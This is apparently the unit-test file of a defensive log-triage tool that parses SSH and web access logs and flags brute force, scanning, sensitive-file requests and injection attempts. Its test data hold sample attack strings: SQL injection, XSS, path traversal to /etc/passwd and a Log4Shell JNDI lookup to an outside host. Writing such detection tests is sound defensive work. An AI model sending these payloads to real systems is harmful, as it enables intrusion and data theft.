import io
import json
import subprocess
import sys
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from datetime import datetime, timedelta
from pathlib import Path

from logtriage.cli import main
from logtriage.detectors import Settings, run_all
from logtriage.parsers import YearGuesser, parse_access_line, parse_auth_line, parse_lines
from logtriage.report import to_html, to_json, to_text

ROOT = Path(__file__).resolve().parent.parent
SAMPLES = ROOT / "samples"


def auth(*lines, year=2026):
    return parse_lines(lines, year).auth


def ssh_fail(t, ip="203.0.113.5", user="root", invalid=False):
    who = f"invalid user {user}" if invalid else user
    return f"Nov 18 {t} web01 sshd[100]: Failed password for {who} from {ip} port 4000 ssh2"


class AuthParsing(unittest.TestCase):
    def test_failed_and_invalid_user(self):
        evs = auth(ssh_fail("02:00:00", user="admin", invalid=True),
                   "Nov 18 02:00:01 web01 sshd[100]: Invalid user oracle from 203.0.113.5 port 4001")
        self.assertEqual([(e.kind, e.user, e.ip) for e in evs],
                         [("failed", "admin", "203.0.113.5"), ("invalid_user", "oracle", "203.0.113.5")])
        self.assertEqual(evs[0].time, datetime(2026, 11, 18, 2, 0, 0))

    def test_accepted_and_ipv6(self):
        (e,) = auth("Nov  3 09:15:02 web01 sshd[9]: Accepted publickey for sid from 2001:db8::7 port 51000 ssh2: ED25519 SHA256:x")
        self.assertEqual((e.kind, e.user, e.ip, e.method), ("accepted", "sid", "2001:db8::7", "publickey"))
        self.assertEqual(e.time.day, 3)

    def test_rfc3339_timestamp(self):
        (e,) = auth("2026-11-18T02:00:00.123456789+12:00 web01 sshd-session[55]: Failed password for root from 198.51.100.1 port 1 ssh2")
        self.assertEqual(e.time, datetime(2026, 11, 18, 2, 0, 0, 123456))

    def test_message_repeated_expands(self):
        evs = auth("Nov 18 02:00:00 web01 sshd[1]: message repeated 3 times: [ Failed password for root from 203.0.113.5 port 1 ssh2]")
        self.assertEqual(len(evs), 3)

    def test_sudo(self):
        evs = auth("Nov 18 02:00:00 web01 sudo:   bob : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/ ; USER=root ; COMMAND=/bin/sh",
                   "Nov 18 02:01:00 web01 sudo: amy : TTY=pts/0 ; PWD=/home/amy ; USER=root ; COMMAND=/usr/bin/apt update")
        self.assertEqual([(e.kind, e.user) for e in evs], [("sudo_fail", "bob"), ("sudo_ok", "amy")])
        self.assertEqual(evs[1].method, "/usr/bin/apt update")

    def test_noise_and_bad_input_are_skipped(self):
        r = parse_lines(["Nov 18 02:00:00 web01 CRON[5]: (root) CMD (run-parts /etc/cron.hourly)",
                         "Nov 18 02:00:00 web01 sshd[1]: Failed password for root from not-an-ip port 1 ssh2",
                         "Feb 30 02:00:00 web01 sshd[1]: Failed password for root from 1.2.3.4 port 1 ssh2",
                         "complete garbage", ""], 2026)
        self.assertEqual((r.lines, r.skipped, len(r.auth)), (4, 4, 0))

    def test_year_rolls_over_in_january(self):
        y = YearGuesser(2025)
        self.assertEqual([y.resolve(m) for m in (11, 12, 12, 1, 2)], [2025, 2025, 2025, 2026, 2026])


class AccessParsing(unittest.TestCase):
    def test_combined_format(self):
        e = parse_access_line('203.0.113.9 - - [18/Nov/2026:11:27:05 +1200] "GET /.env HTTP/1.1" 200 734 "-" "python-requests/2.32.3"')
        self.assertEqual((e.ip, e.method, e.path, e.status, e.size, e.agent),
                         ("203.0.113.9", "GET", "/.env", 200, 734, "python-requests/2.32.3"))
        self.assertEqual(e.time, datetime(2026, 11, 18, 11, 27, 5))

    def test_common_format_dash_size_and_junk_request(self):
        e = parse_access_line('198.51.100.3 - - [18/Nov/2026:11:00:00 +0000] "\\x16\\x03\\x01" 400 -')
        self.assertEqual((e.status, e.size, e.method), (400, 0, ""))

    def test_escaped_quote_in_agent(self):
        e = parse_access_line('198.51.100.3 - - [18/Nov/2026:11:00:00 +0000] "GET / HTTP/1.1" 200 5 "-" "a \\"quoted\\" agent"')
        self.assertEqual(e.agent, 'a \\"quoted\\" agent')

    def test_rejects_non_access_lines(self):
        self.assertIsNone(parse_access_line("Nov 18 02:00:00 web01 sshd[1]: Failed password for root from 1.2.3.4 port 1 ssh2"))
        self.assertIsNone(parse_access_line('nonsense - - [18/Nov/2026:11:00:00 +0000] "GET / HTTP/1.1" 200 5'))


class SSHRules(unittest.TestCase):
    def rules(self, events, **kw):
        return [f.rule for f in run_all(events, [], Settings(**kw))]

    def test_bruteforce_needs_failures_inside_the_window(self):
        fast = auth(*[ssh_fail(f"02:{i // 60:02d}:{i % 60:02d}") for i in range(0, 600, 30)])  # 20 in 10 min
        self.assertIn("ssh-bruteforce", self.rules(fast))
        slow = auth(*[ssh_fail(f"{2 + i // 4:02d}:{(i % 4) * 15:02d}:00") for i in range(20)])  # 20 over 5 hours
        self.assertNotIn("ssh-bruteforce", self.rules(slow))
        self.assertIn("ssh-bruteforce", self.rules(slow, ssh_window=timedelta(hours=6)))

    def test_invalid_user_lines_are_not_double_counted(self):
        lines = []
        for i in range(6):
            t = f"02:00:{i:02d}"
            lines += [f"Nov 18 {t} web01 sshd[1]: Invalid user u{i} from 203.0.113.5 port 1", ssh_fail(t, user=f"u{i}", invalid=True)]
        (f,) = [f for f in run_all(auth(*lines), [], Settings(ssh_failures=6)) if f.rule == "ssh-bruteforce"]
        self.assertEqual(f.count, 6)

    def test_login_after_failures_is_critical(self):
        evs = auth(ssh_fail("03:00:00", user="deploy"), ssh_fail("03:00:10", user="deploy"), ssh_fail("03:00:20", user="deploy"),
                   "Nov 18 03:01:00 web01 sshd[2]: Accepted password for deploy from 203.0.113.5 port 9 ssh2")
        (f,) = [f for f in run_all(evs, []) if f.rule == "ssh-login-after-failures"]
        self.assertEqual((f.severity, f.user, f.ip, f.count), ("critical", "deploy", "203.0.113.5", 4))
        self.assertIn("Accepted password", f.evidence[-1])

    def test_success_from_a_different_ip_is_not_flagged(self):
        evs = auth(*[ssh_fail(f"03:00:{i:02d}") for i in range(5)],
                   "Nov 18 03:01:00 web01 sshd[2]: Accepted publickey for root from 192.0.2.10 port 9 ssh2")
        self.assertNotIn("ssh-login-after-failures", self.rules(evs))
        self.assertIn("ssh-root-login", self.rules(evs))

    def test_enumeration_counts_distinct_users(self):
        evs = auth(*[ssh_fail(f"0{i}:00:00", user=f"user{i}", invalid=True) for i in range(5)])
        self.assertIn("ssh-user-enumeration", self.rules(evs))
        self.assertNotIn("ssh-user-enumeration", self.rules(evs[:4]))

    def test_ignore_networks(self):
        import ipaddress
        evs = auth(*[ssh_fail(f"02:00:{i:02d}") for i in range(30)])
        self.assertEqual(self.rules(evs, ignore_networks=[ipaddress.ip_network("203.0.113.0/24")]), [])


class WebRules(unittest.TestCase):
    def web(self, *rows):
        lines = [f'{ip} - - [18/Nov/2026:10:{i // 60:02d}:{i % 60:02d} +1200] "GET {path} HTTP/1.1" {status} 10 "-" "{agent}"'
                 for i, (ip, path, status, agent) in enumerate(rows)]
        return parse_lines(lines, 2026).web

    def test_scanner_and_sensitive_files(self):
        rows = [("198.51.100.200", p, 404, "x") for p in ["/.env", "/.git/config", "/wp-login.php"] + [f"/x{i}" for i in range(40)]]
        rules = {f.rule: f for f in run_all([], self.web(*rows))}
        self.assertEqual(rules["web-scanner"].severity, "high")
        self.assertEqual(rules["web-sensitive-files"].severity, "medium")

    def test_served_secret_is_critical(self):
        rows = [("203.0.113.9", "/.git/config", 404, "x"), ("203.0.113.9", "/.env", 200, "x"), ("203.0.113.9", "/backup.zip", 200, "x")]
        (f,) = [f for f in run_all([], self.web(*rows)) if f.rule == "web-sensitive-files"]
        self.assertEqual(f.severity, "critical")
        self.assertIn("/.env", f.detail)

    def test_sensitive_pattern_does_not_match_lookalikes(self):
        rows = [("192.0.2.5", p, 200, "x") for p in ["/blog/.environment-setup", "/docs/git-config-guide", "/envelope.png"]]
        self.assertEqual([f.rule for f in run_all([], self.web(*rows))], [])

    def test_attack_patterns_including_double_encoding(self):
        rows = [("198.51.100.66", "/p?id=1%2527%2520OR%2520%25271%2527%253D%25271", 500, "x"),
                ("198.51.100.66", "/s?q=%3Cscript%3Ealert(1)%3C/script%3E", 200, "x"),
                ("198.51.100.66", "/f?file=..%2f..%2fetc%2fpasswd", 400, "x"),
                ("198.51.100.71", "/", 200, "${jndi:ldap://198.51.100.71/a}")]
        rules = {f.rule: f.severity for f in run_all([], self.web(*rows))}
        self.assertEqual(rules, {"web-sqli": "medium", "web-xss": "high", "web-path-traversal": "medium", "web-log4shell": "high"})

    def test_normal_traffic_is_quiet(self):
        rows = [("192.0.2.%d" % (i % 50), p, 200, "Mozilla/5.0") for i, p in
                enumerate(["/", "/about", "/search?q=union+station+opening+hours", "/blog/how-to-select-a-router"] * 50)]
        self.assertEqual(run_all([], self.web(*rows)), [])

    def test_5xx_burst(self):
        rows = [("192.0.2.%d" % i, "/", 502, "x") for i in range(25)]
        (f,) = run_all([], self.web(*rows))
        self.assertEqual((f.rule, f.count), ("web-5xx-burst", 25))


class Reports(unittest.TestCase):
    def setUp(self):
        self.result = parse_lines([
            ssh_fail("02:00:00", user="<script>alert(1)</script>"),
            '198.51.100.1 - - [18/Nov/2026:10:00:00 +0000] "GET /a?<img src=x onerror=alert(1)> HTTP/1.1" 200 1 "-" "x"',
        ], 2026)
        self.findings = run_all(self.result.auth, self.result.web, Settings(ssh_failures=1, spray_users=1))

    def test_html_escapes_log_content(self):
        page = to_html(self.result, self.findings, sources=["<b>auth.log</b>"], generated=datetime(2026, 11, 20))
        self.assertNotIn("<script>alert", page)
        self.assertNotIn("<img src=x", page)
        self.assertNotIn("<b>auth.log</b>", page)
        self.assertIn("&lt;script&gt;", page)
        self.assertIn("default-src 'none'", page)

    def test_json_is_valid_and_complete(self):
        data = json.loads(to_json(self.result, self.findings))
        self.assertEqual(data["summary"]["lines"], 2)
        self.assertTrue(all({"severity", "rule", "evidence", "first_seen"} <= set(f) for f in data["findings"]))

    def test_text_mentions_every_finding(self):
        text = to_text(self.result, self.findings)
        for f in self.findings:
            self.assertIn(f.title, text)


class CommandLine(unittest.TestCase):
    def run_cli(self, *args):
        out, err = io.StringIO(), io.StringIO()
        with redirect_stdout(out), redirect_stderr(err):
            code = main(list(args))
        return code, out.getvalue(), err.getvalue()

    def test_samples_end_to_end(self):
        code, out, _ = self.run_cli(str(SAMPLES / "auth.log"), str(SAMPLES / "access.log"), "--year", "2026", "-f", "json")
        self.assertEqual(code, 2)
        rules = {f["rule"] for f in json.loads(out)["findings"]}
        self.assertTrue({"ssh-login-after-failures", "ssh-bruteforce", "web-scanner", "web-sensitive-files",
                         "web-sqli", "web-log4shell", "sudo-failures", "ssh-root-login", "web-5xx-burst"} <= rules)
        self.assertEqual(json.loads(out)["summary"]["skipped"], 0)

    def test_fail_on_and_min_severity(self):
        code, out, _ = self.run_cli(str(SAMPLES / "access.log"), "--year", "2026", "--fail-on", "critical", "--min-severity", "critical")
        self.assertEqual(code, 2)
        self.assertIn("CRITICAL", out)
        self.assertNotIn("MEDIUM", out)
        code, _, _ = self.run_cli(str(SAMPLES / "auth.log"), "--year", "2026", "--ignore", "203.0.113.0/24", "--fail-on", "critical")
        self.assertEqual(code, 0)

    def test_gzip_and_output_file(self):
        import gzip
        with tempfile.TemporaryDirectory() as d:
            gz = Path(d) / "auth.log.gz"
            gz.write_bytes(gzip.compress((SAMPLES / "auth.log").read_bytes()))
            report = Path(d) / "r.html"
            code, out, err = self.run_cli(str(gz), "--year", "2026", "-f", "html", "-o", str(report))
            self.assertEqual(out, "")
            self.assertIn("Wrote", err)
            self.assertIn("SSH brute force", report.read_text(encoding="utf-8"))

    def test_errors(self):
        code, _, err = self.run_cli("does-not-exist.log")
        self.assertEqual(code, 1)
        self.assertIn("cannot read", err)
        code, _, err = self.run_cli(str(SAMPLES / "auth.log"), "--ignore", "nonsense")
        self.assertEqual(code, 1)
        code, _, err = self.run_cli(str(SAMPLES / "auth.log"), "--ssh-failures", "0")
        self.assertEqual(code, 1)

    def test_python_dash_m(self):
        p = subprocess.run([sys.executable, "-m", "logtriage", "--version"], capture_output=True, text=True, cwd=ROOT)
        self.assertEqual(p.returncode, 0)
        self.assertIn("log-triage", p.stdout)


if __name__ == "__main__":
    unittest.main()
